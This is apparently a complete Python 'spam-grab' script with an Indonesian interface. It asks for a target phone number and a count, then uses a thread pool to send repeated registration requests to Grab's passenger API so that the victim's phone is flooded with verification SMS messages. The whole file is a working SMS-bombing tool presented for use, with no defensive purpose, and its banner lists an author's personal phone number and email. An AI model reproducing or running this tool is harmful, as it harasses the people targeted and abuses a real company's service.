#!/usr/bin/python

"""
"""
from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	print("""\033[1;32m_
 ___ _ __   __ _ _ __ ___         __ _ _ __ __ _| |__
/ __| '_ \ / _` | '_ ` _ \ _____ / _` | '__/ _` | '_ \
\__ \ |_) | (_| | | | | | |_____| (_| | | | (_| | |_) |
|___/ .__/ \__,_|_| |_| |_|      \__, |_|  \__,_|_.__/
    |_|                          |___/

\033[0;32m================================================================>
\033[1;32mAuthor Oleh \033[1;31m:\033[1;0mWahyu Sibran
\033[1;32mContac \033[1;31m     :\033[1;0m087730882553
\033[1;32mEmail \033[1;31m      :\033[1;0mWakhyus@gmail.com



""")
	no = input("\033[1;37m[?] NOMOR (Pakai 62 Gan) =>\033[1;36m ")
	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("[*] RESULT:")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SUKSES")
		else:
			print("\033[1;31m[-] GAGAL")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("done ^•^")
